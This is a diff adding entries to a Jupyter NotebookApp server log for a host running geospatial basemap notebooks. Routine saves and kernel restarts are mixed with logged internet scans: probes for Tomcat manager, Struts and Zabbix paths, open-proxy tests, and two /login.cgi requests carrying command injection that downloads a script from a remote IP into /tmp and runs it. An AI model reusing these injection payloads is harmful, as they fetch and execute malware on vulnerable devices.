@@ -11214,3 +11214,361 @@ r.to.vect complete.
 [W 17:15:21.088 NotebookApp] 404 GET /login.cgi?cli=aa%20aa%27;wget%20http://176.32.33.171/bin%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ (156.216.244.238) 1.70ms referer=None
 [I 17:24:49.244 NotebookApp] 302 GET / (209.17.96.2) 0.54ms
 [I 18:21:53.215 NotebookApp] 302 GET / (200.192.151.84) 0.69ms
+[W 20:08:29.812 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 1.61ms referer=None
+[I 20:09:55.211 NotebookApp] 302 GET / (221.125.166.215) 0.57ms
+[W 20:16:53.643 NotebookApp] 404 GET http://www.bing.com (163.172.168.251) 1.74ms referer=None
+[W 20:27:00.906 NotebookApp] WebSocket ping timeout after 119936 ms.
+[W 20:27:04.112 NotebookApp] WebSocket ping timeout after 119969 ms.
+[W 20:27:04.900 NotebookApp] WebSocket ping timeout after 119765 ms.
+[W 20:27:05.242 NotebookApp] WebSocket ping timeout after 119971 ms.
+[W 20:27:06.561 NotebookApp] WebSocket ping timeout after 119972 ms.
+[W 20:27:07.948 NotebookApp] WebSocket ping timeout after 119970 ms.
+[W 20:27:08.444 NotebookApp] WebSocket ping timeout after 119971 ms.
+[W 20:27:09.176 NotebookApp] WebSocket ping timeout after 119951 ms.
+[W 20:27:10.959 NotebookApp] WebSocket ping timeout after 119882 ms.
+[W 20:27:13.119 NotebookApp] WebSocket ping timeout after 119971 ms.
+[W 20:27:13.448 NotebookApp] WebSocket ping timeout after 119922 ms.
+[W 20:27:18.397 NotebookApp] WebSocket ping timeout after 119955 ms.
+[W 20:27:20.455 NotebookApp] WebSocket ping timeout after 119970 ms.
+[W 20:27:21.968 NotebookApp] WebSocket ping timeout after 119971 ms.
+[W 20:27:27.919 NotebookApp] WebSocket ping timeout after 119971 ms.
+[W 20:27:27.982 NotebookApp] WebSocket ping timeout after 119971 ms.
+[W 20:27:28.030 NotebookApp] WebSocket ping timeout after 119960 ms.
+[I 20:27:41.590 NotebookApp] 302 GET / (123.249.4.11) 0.45ms
+[I 20:27:41.894 NotebookApp] 302 GET /tree? (123.249.4.11) 0.93ms
+[W 20:27:42.504 NotebookApp] 404 GET /index.action (123.249.4.11) 1.65ms referer=None
+[W 20:38:35.977 NotebookApp] 404 GET //manager/html (81.17.25.29) 1.59ms referer=None
+[I 20:52:32.459 NotebookApp] 302 GET / (191.23.41.136) 0.57ms
+[I 21:13:28.023 NotebookApp] 302 GET / (46.19.43.34) 0.50ms
+[I 21:31:01.621 NotebookApp] 302 GET / (189.68.203.127) 0.55ms
+[W 21:34:16.620 NotebookApp] 404 GET /login.cgi?cli=aa%20aa%27;wget%20http://148.72.176.78/ken.sh%20-O%20-%3E%20/tmp/ken.sh;sh%20/tmp/ken.sh%27$ (42.115.173.217) 2.15ms referer=None
+[W 22:40:01.017 NotebookApp] 404 GET /manager/html (111.73.46.19) 1.67ms referer=None
+[I 22:53:02.706 NotebookApp] 302 GET / (186.46.7.106) 0.57ms
+[W 00:06:19.926 NotebookApp] 404 GET http://www.bing.com (163.172.149.131) 2.20ms referer=None
+[W 00:15:44.327 NotebookApp] 404 GET http://www.bing.com (163.172.168.251) 1.90ms referer=None
+[I 00:26:08.547 NotebookApp] 302 GET / (184.105.139.67) 0.66ms
+[I 00:26:53.793 NotebookApp] 302 GET / (185.131.188.112) 0.50ms
+[W 00:29:55.669 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 2.05ms referer=None
+[I 00:32:21.714 NotebookApp] 302 GET / (46.217.52.178) 0.65ms
+[I 01:35:57.900 NotebookApp] 302 GET / (193.70.103.148) 0.56ms
+[I 01:35:58.058 NotebookApp] 302 GET /tree? (193.70.103.148) 0.98ms
+[I 01:39:47.685 NotebookApp] 302 GET / (196.52.43.101) 0.57ms
+[W 03:57:15.506 NotebookApp] 404 GET http://www.bing.com (212.47.227.163) 1.72ms referer=None
+[I 05:37:07.811 NotebookApp] 302 GET / (195.46.184.10) 0.60ms
+[I 05:38:12.508 NotebookApp] 302 GET / (185.161.244.94) 0.50ms
+[W 05:50:39.716 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 1.67ms referer=None
+[I 05:59:34.688 NotebookApp] 302 GET / (36.66.35.205) 0.52ms
+[I 06:16:55.038 NotebookApp] 302 GET / (201.42.152.196) 0.58ms
+[I 06:26:36.154 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 06:26:37.148 NotebookApp] Adapting to protocol v5.1 for kernel 924659f8-5768-43ea-90dd-dfa7728e25dc
+[I 06:26:39.149 NotebookApp] Adapting to protocol v5.1 for kernel 6e16796d-7576-4b5e-ba60-22e8e7250dce
+[I 06:26:41.121 NotebookApp] Adapting to protocol v5.1 for kernel e864cd25-a615-4ad1-87a6-76f5d299ca03
+[I 06:26:42.124 NotebookApp] Adapting to protocol v5.1 for kernel 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[I 06:26:49.127 NotebookApp] Adapting to protocol v5.1 for kernel 54561e73-0aae-402f-936a-4f505d5f2eb2
+[I 06:26:50.123 NotebookApp] Adapting to protocol v5.1 for kernel f2825ae6-636b-492f-907d-bf3aac220bf4
+[I 06:26:56.116 NotebookApp] Adapting to protocol v5.1 for kernel 3fb86dcc-f54a-42e2-977c-c3f6840b44be
+[I 06:27:05.173 NotebookApp] Adapting to protocol v5.1 for kernel a591dd3a-8899-4c56-99c2-35d6841eda1e
+[I 06:27:09.126 NotebookApp] Adapting to protocol v5.1 for kernel 06c9b771-57cd-4dff-b606-4e93dfa640af
+[I 06:27:18.124 NotebookApp] Adapting to protocol v5.1 for kernel d68b923d-fce6-4cca-b69e-c6a0bf865fda
+[I 06:27:40.127 NotebookApp] Adapting to protocol v5.1 for kernel bdb705dc-bd5f-4703-99f1-72b31a37a92c
+[I 06:27:43.124 NotebookApp] Adapting to protocol v5.1 for kernel fa8b807e-fd21-4c29-8eba-2bd21cf233c7
+[I 06:28:12.119 NotebookApp] Adapting to protocol v5.1 for kernel 060b8a36-ee82-4e9c-b32f-30d17c076d50
+[I 06:28:56.124 NotebookApp] Adapting to protocol v5.1 for kernel 76388a24-358e-4f54-bdaa-239ebb9dfc7e
+[I 06:29:42.119 NotebookApp] Adapting to protocol v5.1 for kernel 85d23503-7d43-4dde-bbdb-7c91385085d2
+[I 06:35:01.112 NotebookApp] Adapting to protocol v5.1 for kernel 9b5b764d-5b97-4978-9010-8203b4395fdf
+[I 07:17:56.075 NotebookApp] 302 GET / (139.162.111.98) 0.49ms
+[I 07:17:56.534 NotebookApp] 302 GET /tree? (139.162.111.98) 0.74ms
+[I 07:56:25.006 NotebookApp] 302 GET / (131.100.17.11) 0.50ms
+[W 08:19:11.955 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 1.62ms referer=None
+[W 08:45:07.096 NotebookApp] 404 GET http://www.bing.com (212.47.227.163) 2.32ms referer=None
+[I 08:47:55.483 NotebookApp] 302 GET / (41.242.80.80) 0.50ms
+[W 08:52:04.888 NotebookApp] 404 GET /script (58.218.56.121) 2.08ms referer=None
+[I 09:00:18.965 NotebookApp] 302 GET / (88.148.41.9) 0.63ms
+[I 10:09:16.641 NotebookApp] 302 GET / (103.206.117.12) 0.50ms
+[W 10:23:13.126 NotebookApp] WebSocket ping timeout after 119976 ms.
+[W 10:23:18.125 NotebookApp] WebSocket ping timeout after 119917 ms.
+[W 10:23:19.128 NotebookApp] WebSocket ping timeout after 119976 ms.
+[W 10:23:20.125 NotebookApp] WebSocket ping timeout after 119932 ms.
+[W 10:23:26.117 NotebookApp] WebSocket ping timeout after 119976 ms.
+[W 10:23:26.125 NotebookApp] WebSocket ping timeout after 119978 ms.
+[W 10:23:31.113 NotebookApp] WebSocket ping timeout after 119976 ms.
+[W 10:23:35.174 NotebookApp] WebSocket ping timeout after 119973 ms.
+[W 10:23:36.155 NotebookApp] WebSocket ping timeout after 119878 ms.
+[W 10:23:37.150 NotebookApp] WebSocket ping timeout after 119932 ms.
+[W 10:23:39.128 NotebookApp] WebSocket ping timeout after 119924 ms.
+[W 10:23:39.151 NotebookApp] WebSocket ping timeout after 119947 ms.
+[W 10:23:40.128 NotebookApp] WebSocket ping timeout after 119881 ms.
+[W 10:23:41.122 NotebookApp] WebSocket ping timeout after 119976 ms.
+[W 10:23:42.120 NotebookApp] WebSocket ping timeout after 119889 ms.
+[W 10:23:42.121 NotebookApp] WebSocket ping timeout after 119890 ms.
+[W 10:23:42.125 NotebookApp] WebSocket ping timeout after 119893 ms.
+[I 11:19:44.792 NotebookApp] 302 GET / (103.212.90.220) 0.51ms
+[I 11:29:31.047 NotebookApp] 302 GET / (170.81.140.118) 0.63ms
+[W 12:11:04.016 NotebookApp] 404 GET http://www.bing.com (163.172.168.251) 3.23ms referer=None
+[W 12:17:25.070 NotebookApp] 404 GET http://www.bing.com (212.47.227.163) 1.71ms referer=None
+[I 12:38:36.861 NotebookApp] 302 GET / (36.78.243.8) 0.44ms
+[I 12:54:51.884 NotebookApp] 302 GET / (117.102.227.202) 0.55ms
+[I 12:57:48.479 NotebookApp] 302 GET / (41.242.80.80) 0.54ms
+[W 13:22:12.578 NotebookApp] 404 GET /manager/html (14.177.205.223) 1.60ms referer=None
+[W 13:31:09.532 NotebookApp] 404 GET http://www.bing.com (163.172.168.251) 1.66ms referer=None
+[I 14:29:56.780 NotebookApp] 302 GET / (80.90.81.92) 0.48ms
+[W 14:40:08.538 NotebookApp] 404 GET http://www.bing.com (163.172.149.131) 2.19ms referer=None
+[W 15:00:57.089 NotebookApp] 404 GET http://www.bing.com (212.47.227.163) 1.79ms referer=None
+[I 15:30:42.506 NotebookApp] 302 GET / (116.220.59.47) 0.56ms
+[W 15:37:00.900 NotebookApp] 404 GET /struts2-showcase/showcase.action (198.57.153.242) 1.61ms referer=None
+[W 15:37:01.251 NotebookApp] 404 GET /actionchaining/actionChain1.action (198.57.153.242) 1.58ms referer=None
+[W 15:37:02.173 NotebookApp] 404 GET /struts3-showcase/showcase.action (198.57.153.242) 1.66ms referer=None
+[W 15:37:02.487 NotebookApp] 404 GET /showcase.action (198.57.153.242) 1.63ms referer=None
+[W 16:03:47.845 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 1.71ms referer=None
+[I 16:51:34.488 NotebookApp] 302 GET /tree/ (66.249.93.198) 0.75ms
+[W 17:16:52.214 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (80.254.184.33) 1.54ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 17:16:54.837 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[W 17:17:00.193 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (80.254.184.33) 1.72ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 17:17:05.858 NotebookApp] Adapting to protocol v5.1 for kernel 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[I 17:19:22.042 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 17:22:39.613 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 17:25:41.801 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 17:27:07.278 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 17:29:19.468 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 17:32:42.835 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 17:35:42.068 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[W 17:35:57.103 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (80.254.184.33) 1.76ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 17:35:59.432 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 17:36:00.592 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 18:01:25.550 NotebookApp] 302 GET / (190.148.148.34) 0.67ms
+[W 18:02:57.004 NotebookApp] 404 GET http://www.bing.com (163.172.149.131) 1.81ms referer=None
+[I 18:28:02.989 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:34:02.960 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:34:52.583 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:36:03.141 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:36:10.134 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[W 18:36:25.335 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 1.88ms referer=None
+[I 18:44:03.143 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:44:45.851 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:45:05.831 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 18:45:06.735 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 18:46:00.165 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:47:59.842 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:48:48.709 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:53:29.104 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 18:53:29.952 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 18:53:48.965 NotebookApp] Kernel restarted: 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[I 18:53:50.316 NotebookApp] Adapting to protocol v5.1 for kernel 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[I 18:53:59.868 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:56:03.077 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 18:56:53.475 NotebookApp] 302 GET / (213.204.117.106) 0.57ms
+[I 18:57:21.345 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[W 19:12:20.318 NotebookApp] WebSocket ping timeout after 119863 ms.
+[W 19:12:29.953 NotebookApp] WebSocket ping timeout after 119881 ms.
+[I 20:55:39.313 NotebookApp] 302 GET / (36.67.98.249) 0.63ms
+[W 21:04:00.996 NotebookApp] 404 GET /struts2-showcase/showcase.action (119.29.23.225) 2.12ms referer=None
+[W 21:04:10.274 NotebookApp] 404 GET /actionchaining/actionChain1.action (119.29.23.225) 1.68ms referer=None
+[W 21:04:19.356 NotebookApp] 404 GET /showcase.action (119.29.23.225) 2.02ms referer=None
+[W 21:10:43.772 NotebookApp] 404 GET http://www.bing.com (163.172.168.251) 1.71ms referer=None
+[W 21:43:24.854 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 1.85ms referer=None
+[W 22:22:25.029 NotebookApp] 404 GET http://www.bing.com (212.47.227.163) 1.65ms referer=None
+[I 22:27:45.819 NotebookApp] 302 GET / (186.192.16.138) 0.59ms
+[I 23:49:05.090 NotebookApp] 302 GET / (189.126.64.83) 0.62ms
+[W 00:16:20.453 NotebookApp] 404 GET http://www.bing.com (163.172.168.251) 1.65ms referer=None
+[I 00:21:10.409 NotebookApp] 302 GET / (184.105.247.195) 0.55ms
+[I 00:49:10.046 NotebookApp] 302 GET / (72.44.22.242) 0.55ms
+[I 01:01:31.191 NotebookApp] 302 GET / (116.90.230.70) 0.54ms
+[I 01:37:13.022 NotebookApp] 302 GET / (202.93.231.164) 0.61ms
+[I 02:03:47.482 NotebookApp] 302 GET / (180.247.100.11) 0.60ms
+[I 02:51:21.184 NotebookApp] 302 GET / (89.145.184.222) 0.58ms
+[I 03:34:12.519 NotebookApp] 302 GET / (201.93.225.7) 0.61ms
+[W 04:27:03.091 NotebookApp] 404 GET http://www.bing.com (163.172.149.131) 1.79ms referer=None
+[I 04:32:35.747 NotebookApp] Adapting to protocol v5.1 for kernel 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[I 04:32:45.755 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[W 04:47:05.748 NotebookApp] WebSocket ping timeout after 119972 ms.
+[W 04:47:15.757 NotebookApp] WebSocket ping timeout after 119970 ms.
+[W 04:48:15.857 NotebookApp] 404 GET http://www.bing.com (163.172.168.251) 2.10ms referer=None
+[W 04:50:16.605 NotebookApp] 403 POST /zabbix/index.php (113.10.152.196): '_xsrf' argument missing from POST
+[W 04:50:16.607 NotebookApp] 403 POST /zabbix/index.php (113.10.152.196) 273.09ms referer=None
+[W 04:50:17.714 NotebookApp] 403 POST /zabbix/index.php (113.10.152.196): '_xsrf' argument missing from POST
+[W 04:50:17.716 NotebookApp] 403 POST /zabbix/index.php (113.10.152.196) 273.16ms referer=None
+[I 05:24:19.491 NotebookApp] 302 GET / (179.113.204.24) 0.71ms
+[W 05:57:48.251 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 1.67ms referer=None
+[W 06:08:15.397 NotebookApp] 404 GET /manager/html (185.128.40.182) 2.33ms referer=None
+[I 06:28:01.808 NotebookApp] Adapting to protocol v5.1 for kernel 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[I 06:28:11.832 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 06:30:06.371 NotebookApp] 302 GET / (176.58.124.73) 0.74ms
+[I 06:37:50.080 NotebookApp] 302 GET / (178.216.28.134) 0.55ms
+[W 06:48:01.031 NotebookApp] 404 GET /images/logo.gif (58.248.207.54) 1.62ms referer=None
+[W 06:48:03.822 NotebookApp] 404 GET /fdsrwe (58.248.207.54) 1.70ms referer=None
+[I 06:56:02.604 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 06:56:04.568 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 06:56:05.434 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 06:56:05.906 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 06:56:07.070 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 06:56:53.516 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:02:57.386 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:02:58.212 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[W 07:03:25.608 NotebookApp] Notebook data_analysis/RogunHPP.SetupBasemaps.ipynb is not trusted
+[W 07:03:25.662 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (46.14.48.6) 1.70ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:03:28.239 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:03:32.770 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:03:33.483 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:04:44.634 NotebookApp] Kernel restarted: 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[I 07:04:45.312 NotebookApp] Adapting to protocol v5.1 for kernel 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[W 07:05:09.837 NotebookApp] Notebook data_analysis/RogunHPP.SetupBasemaps.ipynb is not trusted
+[W 07:05:09.921 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (46.14.48.6) 2.35ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:05:12.293 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:05:23.443 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:05:24.745 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:06:26.640 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[W 07:07:00.688 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (46.14.48.6) 1.68ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:07:03.145 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:07:18.998 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:07:19.950 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:07:22.264 NotebookApp] Saving file at /data_analysis/ShnoghHEP.SetupBasemaps.ipynb
+[I 07:07:43.881 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:07:44.643 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:08:36.393 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:08:37.110 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:09:03.808 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:11:03.987 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:13:04.268 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:14:46.178 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:14:50.634 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:14:51.553 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:15:02.998 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:17:06.356 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:25:06.559 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[W 07:25:08.820 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (46.14.48.6) 1.90ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.AlignmentDXFtoNodesCSV.ipynb
+[I 07:25:09.591 NotebookApp] Adapting to protocol v5.1 for kernel d68b923d-fce6-4cca-b69e-c6a0bf865fda
+[I 07:25:15.432 NotebookApp] Kernel restarted: d68b923d-fce6-4cca-b69e-c6a0bf865fda
+[I 07:25:16.189 NotebookApp] Adapting to protocol v5.1 for kernel d68b923d-fce6-4cca-b69e-c6a0bf865fda
+[W 07:25:30.209 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (46.14.48.6) 1.70ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/ShnoghHEP.SetupBasemaps.Learning.ipynb
+[I 07:25:41.149 NotebookApp] Adapting to protocol v5.1 for kernel 924659f8-5768-43ea-90dd-dfa7728e25dc
+[I 07:26:59.074 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:27:09.808 NotebookApp] Saving file at /data_analysis/RogunHPP.AlignmentDXFtoNodesCSV.ipynb
+[I 07:27:27.511 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:29:05.589 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:29:25.519 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:29:26.283 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:31:04.127 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:33:06.808 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:44:46.461 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:47:06.449 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:52:01.053 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:52:01.892 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:53:03.283 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:55:06.819 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:56:41.607 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:57:06.284 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:58:24.814 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 07:58:41.683 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:58:42.505 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 07:59:02.932 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:01:06.913 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:02:03.564 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:02:05.214 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[W 08:02:05.432 NotebookApp] zmq message arrived on closed channel
+[I 08:02:06.494 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:03:03.286 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:05:06.785 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:17:03.616 NotebookApp] 302 GET / (189.56.82.130) 0.59ms
+[I 08:17:23.723 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:19:06.789 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:21:06.261 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:23:11.840 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:24:50.644 NotebookApp] 302 GET / (178.93.13.99) 0.51ms
+[I 08:25:04.062 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:25:04.876 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:25:05.841 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:25:09.756 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:27:05.481 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:29:07.185 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:29:49.714 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:29:51.831 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:29:52.600 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:31:04.012 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:33:03.608 NotebookApp] 302 GET /api/contents/data_analysis/RogunHPP.SetupBasemaps.ipynb?content=0&_=1535526420348 (46.14.48.6) 1.50ms
+[W 08:33:06.436 NotebookApp] None
+[W 08:33:06.437 NotebookApp] 403 PUT /api/contents/data_analysis/RogunHPP.SetupBasemaps.ipynb (46.14.48.6) 2187.24ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:33:21.604 NotebookApp] 302 GET /api/sessions?_=1535388592570 (46.14.48.6) 1.49ms
+[I 08:33:21.607 NotebookApp] 302 GET /api/terminals?_=1535388592571 (46.14.48.6) 1.13ms
+[I 08:34:21.598 NotebookApp] 302 GET /api/sessions?_=1535388592572 (46.14.48.6) 1.33ms
+[I 08:34:21.602 NotebookApp] 302 GET /api/terminals?_=1535388592573 (46.14.48.6) 1.08ms
+[W 08:34:30.226 NotebookApp] None
